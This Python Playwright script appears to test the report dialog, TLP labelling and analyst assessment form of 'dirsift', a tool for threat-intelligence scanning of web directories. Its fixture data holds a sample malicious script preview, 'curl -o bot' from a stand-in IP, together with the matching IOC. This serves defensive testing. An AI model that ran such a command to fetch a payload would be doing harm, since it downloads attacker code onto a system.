"""End to end checks for the report window and the analyst assessment form.

Like the other scripts here this drives a real browser, so it is not part of
the normal test run. Run it by hand when the report window, the assessment form
or the report routes change.

What it covers:
  * the Report link opens a dialog: focus lands on its title, Tab and Shift+Tab
    stay inside, Esc and the scrim close it, focus goes back to the link
  * Format: PDF by default, the Download button follows the choice, and the
    files save as dirsift_<run>_report.pdf and dirsift_<run>_report.md
  * TLP: the definition follows the choice; a choice less restrictive than the
    label saved for the run shows the downgrade sentence, a stricter one does not
  * Copy as text puts the Markdown without the logo image on the clipboard
  * the assessment: a save moves the version from 1.0 to 1.1, the same values
    saved again stay at 1.1, Final with missing fields is refused and counts
    them, Ruled out without a reason is refused, a stale form gets the 409
    sentence, and a saved TLP feeds the downgrade warning
  * without the script the window is the last part of the page and both
    downloads and a save still work
  * axe (serious and critical) is 0 with the window open, the form empty and
    filled, and in the refused and conflict states; nothing scrolls sideways
    from 280 to 1460 pixels; every focus stop in the window shows its ring
  * no page error and no console error

How to run (Chromium by default; name firefox or webkit to add them):

    uv run --with playwright python tests/e2e/report_dialog_e2e.py
    uv run --with playwright python tests/e2e/report_dialog_e2e.py chromium firefox

axe-core is loaded from a CDN unless DIRSIFT_AXE_JS points at a local
axe.min.js. The script starts its own server on 127.0.0.1:8812 against
throwaway runs, so no real target is touched. Exit code 0 when every check
passes.
"""

from __future__ import annotations

import json
import os
import socket
import sys
import tempfile
import threading
import time
from pathlib import Path

import uvicorn

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from dirsift.models import Entry, Ioc, ScanResult  # noqa: E402
from dirsift.web import create_app  # noqa: E402

HOST = "127.0.0.1"
PORT = 8812
BASE = f"http://{HOST}:{PORT}"
ROOT = "http://127.0.0.1:8080/"
AXE_CDN = "https://cdnjs.cloudflare.com/ajax/libs/axe-core/4.14.0/axe.min.js"
WCAG = ["wcag2a", "wcag2aa", "wcag21a", "wcag21aa", "wcag22aa"]
WIDTHS = (280, 320, 414, 768, 1024, 1280, 1460)
BROWSERS = ("chromium", "firefox", "webkit")

DOWNGRADE = "TLP:GREEN is less restrictive than the saved TLP:RED for this run."
CONFLICT = "This assessment changed since you opened it; reload to see the saved version."


def build_runs(runs_dir: Path) -> None:
    """Three runs with the same small listing: one never assessed, one with RED
    saved for it, and one the form checks write to."""
    script = Entry(
        url=ROOT + "install.sh",
        name="install.sh",
        depth=1,
        kind="script",
        confidence="sniffed",
        fetched_bytes=60,
        size=60,
        sha256="c" * 64,
        md5="d" * 32,
        text_preview="curl -o bot http://203.0.113.24/bot",
    )
    result = ScanResult(
        root_url=ROOT,
        listing_flavor="python",
        entries=[script],
        iocs=[
            Ioc(
                ioc_type="url",
                value="http://203.0.113.24/bot",
                defanged="hxxp://203[.]0[.]113[.]24/bot",
                source_url=script.url,
            )
        ],
    )
    for name in ("fam", "red", "form", "plain"):
        (runs_dir / f"{name}.json").write_text(result.model_dump_json(), encoding="utf-8")
    sidecars = runs_dir / "assessments"
    sidecars.mkdir(exist_ok=True)
    (sidecars / "red.json").write_text(
        json.dumps({"schema": 1, "revision": 1, "tlp": "RED", "status": "Preliminary"}),
        encoding="utf-8",
    )


def wait_for_port() -> None:
    for _ in range(100):
        with socket.socket() as probe:
            if probe.connect_ex((HOST, PORT)) == 0:
                return
        time.sleep(0.1)
    raise RuntimeError("server did not come up")


class Checks:
    def __init__(self) -> None:
        self.failures: list[str] = []
        self.passes = 0

    def ok(self, label: str, condition: bool) -> None:
        if condition:
            self.passes += 1
            print(f"  pass  {label}")
        else:
            self.failures.append(label)
            print(f"  FAIL  {label}")


def watch_errors(page, errors: list[str]) -> None:
    """422 and 409 are asked for on purpose; the browser logs their status as a
    console error, which is the response, not the page failing."""

    def console(msg) -> None:
        text = msg.text
        if msg.type == "error" and not any(f"status of {c}" in text for c in (409, 422)):
            errors.append(f"console: {text}")

    page.on("pageerror", lambda exc: errors.append(f"pageerror: {exc}"))
    page.on("console", console)


def load_axe(page) -> None:
    if page.evaluate("() => !!window.axe"):
        return
    local = os.environ.get("DIRSIFT_AXE_JS")
    if local:
        page.add_script_tag(path=local)
    else:
        page.add_script_tag(url=AXE_CDN)
    page.wait_for_function("() => !!window.axe")


def axe_clean(page, label: str, checks: Checks) -> None:
    load_axe(page)
    result = page.evaluate(
        "async (tags) => await axe.run(document, {runOnly: {type: 'tag', values: tags}})",
        WCAG,
    )
    hits = [
        f"{v['id']} {v['nodes'][0]['target']}"
        for v in result["violations"]
        if v.get("impact") in ("serious", "critical")
    ]
    checks.ok(f"{label}: axe serious/critical is 0 {hits[:3]}", not hits)


def overflow_clean(page, label: str, checks: Checks) -> None:
    worst = []
    height = page.viewport_size["height"]
    for width in WIDTHS:
        page.set_viewport_size({"width": width, "height": height})
        page.wait_for_timeout(80)
        over = page.evaluate(
            "() => Math.max(document.documentElement.scrollWidth"
            " - document.documentElement.clientWidth,"
            " (() => { const r = document.querySelector('[data-report]');"
            " return r ? r.scrollWidth - r.clientWidth : 0; })(),"
            " (() => { const b = document.querySelector('.report-body');"
            " return b ? b.scrollWidth - b.clientWidth : 0; })())"
        )
        if over > 0:
            worst.append((width, over))
    checks.ok(f"{label}: no sideways scroll at {WIDTHS[0]} to {WIDTHS[-1]} {worst}", not worst)


def open_report(page, run: str) -> None:
    page.goto(f"{BASE}/runs/{run}")
    page.wait_for_selector("[data-report-open]")
    page.click("[data-report-open]")
    page.wait_for_selector("[data-report].is-open")


def open_form(page) -> None:
    page.eval_on_selector("#assessment", "el => { el.open = true; }")
    page.wait_for_selector("#as-author", state="visible")


IS_CLOSED = "() => !document.querySelector('[data-report]').classList.contains('is-open')"


def active(page) -> str:
    return page.evaluate(
        "() => { const e = document.activeElement;"
        " return e ? (e.id || e.className || e.tagName) : ''; }"
    )


def inside_report(page) -> bool:
    return page.evaluate(
        "() => !!document.activeElement && !!document.activeElement.closest('[data-report]')"
    )


RING = """() => {
  const e = document.activeElement; if (!e || e === document.body) return null;
  const c = getComputedStyle(e);
  let ring = (c.boxShadow && c.boxShadow !== 'none') ||
    (c.outlineStyle !== 'none' && parseFloat(c.outlineWidth) > 0);
  if (!ring && e.tagName === 'INPUT') { const l = e.closest('label');
    if (l) { const lc = getComputedStyle(l); ring = lc.boxShadow && lc.boxShadow !== 'none'; } }
  return {id: e.id || e.className || e.tagName, ring: !!ring};
}"""


def dialog_checks(page, tag: str, checks: Checks) -> None:
    open_report(page, "fam")
    checks.ok(f"[{tag}] report: the link opens a dialog",
              page.get_attribute("[data-report]", "role") == "dialog"
              and page.get_attribute("[data-report]", "aria-modal") == "true")
    checks.ok(f"[{tag}] report: focus lands on the title", active(page) == "report-title")

    # Tab walks the window and wraps; nothing behind it takes focus. Every stop
    # shows its ring.
    open_form(page)
    page.focus("#report-title")
    stops = 0
    escaped = []
    no_ring = []
    for _ in range(60):
        page.keyboard.press("Tab")
        stops += 1
        if not inside_report(page):
            escaped.append(active(page))
        info = page.evaluate(RING)
        if info and not info["ring"]:
            no_ring.append(info["id"])
    checks.ok(f"[{tag}] report: Tab stays inside over {stops} presses {escaped[:3]}", not escaped)
    checks.ok(f"[{tag}] report: every stop shows its ring {sorted(set(no_ring))[:4]}", not no_ring)
    page.focus("[data-report-close]")
    page.keyboard.press("Shift+Tab")
    checks.ok(f"[{tag}] report: Shift+Tab from the first stop wraps", inside_report(page))

    page.keyboard.press("Escape")
    closed = page.evaluate(IS_CLOSED)
    checks.ok(f"[{tag}] report: Esc closes it", closed)
    checks.ok(f"[{tag}] report: focus goes back to the Report link",
              page.evaluate("() => document.activeElement.hasAttribute('data-report-open')"))
    page.click("[data-report-open]")
    page.wait_for_selector("[data-report].is-open")
    page.eval_on_selector("[data-report-scrim]", "el => el.click()")
    checks.ok(f"[{tag}] report: the scrim closes it",
              page.evaluate(IS_CLOSED))


def format_checks(page, checks: Checks) -> None:
    open_report(page, "fam")
    checks.ok("report: PDF is the default format",
              page.is_checked("[data-report-format][value=pdf]"))
    with page.expect_download() as got:
        page.click("[data-report-download]")
    pdf = got.value
    checks.ok(f"report: the PDF saves as dirsift_fam_report.pdf ({pdf.suggested_filename})",
              pdf.suggested_filename == "dirsift_fam_report.pdf")
    head = Path(pdf.path()).read_bytes()[:5]
    checks.ok("report: the PDF download is a PDF", head == b"%PDF-")

    page.check("[data-report-format][value=md]")
    checks.ok("report: the button names the format",
              " ".join(page.inner_text("[data-report-download]").split()) == "Download Markdown")
    with page.expect_download() as got:
        page.click("[data-report-download]")
    md = got.value
    checks.ok(f"report: the Markdown saves as dirsift_fam_report.md ({md.suggested_filename})",
              md.suggested_filename == "dirsift_fam_report.md")
    text = Path(md.path()).read_text(encoding="utf-8")
    checks.ok("report: the Markdown opens on the chosen TLP", text.startswith("**TLP:AMBER**"))

    page.select_option("[data-report-tlp]", "RED")
    with page.expect_download() as got:
        page.click("[data-report-download]")
    text = Path(got.value.path()).read_text(encoding="utf-8")
    checks.ok("report: the TLP choice reaches the file", text.startswith("**TLP:RED**"))


def tlp_checks(page, checks: Checks) -> None:
    open_report(page, "fam")
    shown = page.evaluate(
        "() => [...document.querySelectorAll('[data-tlp-def]')].filter(p => !p.hidden)"
        ".map(p => p.getAttribute('data-tlp-def'))"
    )
    checks.ok(f"tlp: one definition shows, the default AMBER ({shown})", shown == ["AMBER"])
    page.select_option("[data-report-tlp]", "CLEAR")
    shown = page.evaluate(
        "() => [...document.querySelectorAll('[data-tlp-def]')].filter(p => !p.hidden)"
        ".map(p => p.innerText)"
    )
    checks.ok("tlp: the definition follows the choice",
              len(shown) == 1 and "spread this to the world" in shown[0])
    checks.ok("tlp: no warning without a saved label", not page.is_visible("[data-report-warn]"))

    open_report(page, "red")
    checks.ok("tlp: the saved RED is the starting choice",
              page.input_value("[data-report-tlp]") == "RED")
    page.select_option("[data-report-tlp]", "GREEN")
    checks.ok("tlp: GREEN below the saved RED shows the warning",
              page.is_visible("[data-report-warn]")
              and page.inner_text("[data-report-warn]").strip() == DOWNGRADE)
    page.select_option("[data-report-tlp]", "RED")
    checks.ok("tlp: back to RED clears it", not page.is_visible("[data-report-warn]"))


def copy_checks(page, checks: Checks, engine: str) -> None:
    open_report(page, "fam")
    if engine == "chromium":
        page.context.grant_permissions(["clipboard-read", "clipboard-write"], origin=BASE)
    page.click("[data-report-copy]")
    page.wait_for_selector(".toast")
    toast = page.inner_text(".toast")
    checks.ok(f"copy: the toast says so ({toast})", toast == "Copied the report as text")
    if engine == "chromium":
        clip = page.evaluate("() => navigator.clipboard.readText()")
        checks.ok("copy: the clipboard holds the Markdown without the logo",
                  clip.startswith("**TLP:AMBER**") and "<img" not in clip and "**DirSift**" in clip)


def version(page) -> str:
    return page.inner_text("[data-assess] .assess-head .chip").strip()


def save(page) -> None:
    def posted(reply) -> bool:
        return reply.url.endswith("/assessment") and reply.request.method == "POST"

    with page.expect_response(posted):
        page.click("[data-assess] button[type=submit]")
    page.wait_for_timeout(150)


def form_checks(page, context, checks: Checks) -> None:
    open_report(page, "form")
    open_form(page)
    axe_clean(page, "form empty, window open", checks)
    checks.ok(f"form: a fresh run is version 1.0 ({version(page)})", version(page) == "Version 1.0")

    page.fill("#as-author", "Test Analyst")
    page.select_option("#as-assessment", "Suspicious")
    help_text = page.inner_text("#as-assessment-def")
    checks.ok("form: the definition follows the choice",
              help_text == "signs of misuse, not enough for a conclusion"
              or "not enough for a conclusion" in help_text)
    page.select_option("#as-confidence", "Moderate")
    page.select_option("#as-priority", "Medium")
    page.fill("#as-bottom_line", "A staging host; see http://198.51.100.7/x.")
    page.fill("#as-rationale", "The script fetches a build from the target.")
    page.fill("#as-found_via", "A listing title search.")
    save(page)
    checks.ok(f"form: the first save is 1.1 ({version(page)})", version(page) == "Version 1.1")
    checks.ok("form: the save is announced",
              "Saved as version 1.1" in page.inner_text("[data-assess] .assess-head"))
    checks.ok("form: focus is kept in the window after the swap", inside_report(page))
    axe_clean(page, "form filled and saved", checks)

    save(page)
    checks.ok(f"form: the same values saved again stay at 1.1 ({version(page)})",
              version(page) == "Version 1.1")

    # Ruled out with no reason is refused.
    page.select_option("#alt-0-status", "Ruled out")
    save(page)
    errors = page.inner_text("[data-assess] .form-errors") if page.is_visible(
        "[data-assess] .form-errors") else ""
    checks.ok(f"form: Ruled out without a reason is refused ({errors[:60]})",
              "Ruled out needs a reason" in errors)
    checks.ok("form: the reason field is marked",
              page.get_attribute("#alt-0-reason", "aria-invalid") == "true")
    checks.ok("form: the refusal keeps the version", version(page) == "Version 1.1")
    axe_clean(page, "form refused (422)", checks)
    page.select_option("#alt-0-status", "Not ruled out")

    # Final with fields missing is refused and the count is given.
    page.fill("#as-author", "")
    page.fill("#as-bottom_line", "")
    page.select_option("#as-status", "Final")
    save(page)
    errors = page.inner_text("[data-assess] .form-errors") if page.is_visible(
        "[data-assess] .form-errors") else ""
    checks.ok(f"form: Final with two fields missing is refused ({errors[:70]})",
              "Final needs 2 more field(s): Author, Bottom line." in errors)
    checks.ok("form: the missing fields are marked",
              page.get_attribute("#as-author", "aria-invalid") == "true"
              and page.get_attribute("#as-bottom_line", "aria-invalid") == "true")

    # A saved TLP feeds the downgrade warning.
    page.fill("#as-author", "Test Analyst")
    page.fill("#as-bottom_line", "A staging host.")
    page.select_option("#as-status", "Preliminary")
    page.select_option("#as-tlp", "RED")
    save(page)
    checks.ok(f"form: the TLP save is 1.2 ({version(page)})", version(page) == "Version 1.2")
    page.select_option("[data-report-tlp]", "GREEN")
    checks.ok("form: the saved RED now warns on GREEN",
              page.is_visible("[data-report-warn]")
              and page.inner_text("[data-report-warn]").strip() == DOWNGRADE)

    # A second window holding the old revision gets the 409 sentence.
    other = context.new_page()
    other.goto(f"{BASE}/runs/form")
    other.click("[data-report-open]")
    other.wait_for_selector("[data-report].is-open")
    open_form(other)
    page.fill("#as-rationale", "Changed in the first window.")
    save(page)
    other.fill("#as-rationale", "Changed in the second window.")
    save(other)
    alert = other.inner_text("[data-assess] [role=alert]") if other.is_visible(
        "[data-assess] [role=alert]") else ""
    checks.ok(f"form: the stale window gets the 409 sentence ({alert[:50]})", CONFLICT in alert)
    axe_clean(other, "form conflict (409)", checks)
    other.close()

    overflow_clean(page, "window open, form filled", checks)


def no_script_checks(browser, checks: Checks) -> None:
    context = browser.new_context(
        viewport={"width": 1280, "height": 900}, java_script_enabled=False, accept_downloads=True
    )
    page = context.new_page()
    page.goto(f"{BASE}/runs/plain")
    checks.ok("no script: the window is part of the page",
              page.is_visible("#report") and page.is_visible("#report-tlp"))
    checks.ok("no script: the Format radios are hidden, two download buttons show",
              not page.is_visible("[data-report-format]")
              and page.is_visible("button[name=download][value='1']"))
    with page.expect_download() as got:
        page.click("[data-report-download]")
    checks.ok(f"no script: Download PDF works ({got.value.suggested_filename})",
              got.value.suggested_filename == "dirsift_plain_report.pdf")
    with page.expect_download() as got:
        page.click("button[name=download][value='1']")
    checks.ok(f"no script: Download Markdown works ({got.value.suggested_filename})",
              got.value.suggested_filename == "dirsift_plain_report.md")

    page.goto(f"{BASE}/runs/plain")
    page.eval_on_selector("#assessment", "el => { el.open = true; }")
    page.fill("#as-author", "Plain Analyst")
    page.click("[data-assess] button[type=submit]")
    page.wait_for_load_state()
    page.eval_on_selector("#assessment", "el => { el.open = true; }")
    checks.ok(f"no script: a plain form save lands back on the run ({page.url[-30:]})",
              "/runs/plain" in page.url and version(page) == "Version 1.1")
    context.close()

    # axe needs a script of its own, so the no script page is drawn with the
    # page's own scripts taken out instead: no js class, no dirsift.js, no htmx.
    context = browser.new_context(viewport={"width": 1280, "height": 900})
    page = context.new_page()

    def without_scripts(route) -> None:
        reply = route.fetch()
        body = reply.text()
        body = body.replace('<script>document.documentElement.classList.add("js");</script>', "")
        body = body.replace('<script src="/static/htmx.min.js" defer></script>', "")
        body = body.replace('<script src="/static/dirsift.js" defer></script>', "")
        route.fulfill(response=reply, body=body)

    page.route(f"{BASE}/runs/plain", without_scripts)
    page.goto(f"{BASE}/runs/plain")
    checks.ok("no script (drawn): the page carries no js class",
              page.evaluate("() => !document.documentElement.classList.contains('js')"))
    page.eval_on_selector("#assessment", "el => { el.open = true; }")
    axe_clean(page, "no script, run page with the window and the form open", checks)
    overflow_clean(page, "no script, run page", checks)
    context.close()


def run_browser(pw, engine: str, checks: Checks) -> None:
    browser = getattr(pw, engine).launch()
    errors: list[str] = []
    for width, height, tag in ((1440, 900, "wide"), (414, 860, "narrow")):
        context = browser.new_context(
            viewport={"width": width, "height": height}, accept_downloads=True
        )
        page = context.new_page()
        watch_errors(page, errors)
        print(f"{engine} {tag} ({width}x{height}):")
        dialog_checks(page, f"{engine} {tag}", checks)
        if tag == "wide":
            open_report(page, "fam")
            axe_clean(page, f"[{engine}] window open", checks)
            open_report(page, "red")
            page.select_option("[data-report-tlp]", "GREEN")
            axe_clean(page, f"[{engine}] window open, downgrade warning", checks)
            format_checks(page, checks)
            tlp_checks(page, checks)
            copy_checks(page, checks, engine)
        else:
            open_report(page, "fam")
            overflow_clean(page, f"[{engine}] window open", checks)
        context.close()
    if engine == "chromium":
        context = browser.new_context(viewport={"width": 1440, "height": 900})
        page = context.new_page()
        watch_errors(page, errors)
        form_checks(page, context, checks)
        context.close()
        no_script_checks(browser, checks)
    browser.close()
    checks.ok(f"[{engine}] no page or console error {errors[:3]}", errors == [])


def main() -> int:
    engines = [name for name in sys.argv[1:] if name in BROWSERS] or ["chromium"]
    tmp = Path(tempfile.mkdtemp(prefix="dirsift-report-e2e-"))
    build_runs(tmp)
    app = create_app(tmp)
    config = uvicorn.Config(app, host=HOST, port=PORT, log_level="warning")
    server = uvicorn.Server(config)
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    wait_for_port()

    checks = Checks()
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("playwright is not installed. See the header of this file for how to run it.")
        return 2

    with sync_playwright() as pw:
        for engine in engines:
            run_browser(pw, engine, checks)

    server.should_exit = True
    print(f"\n{checks.passes} passed, {len(checks.failures)} failed")
    for label in checks.failures:
        print(f"  FAIL  {label}")
    return 1 if checks.failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
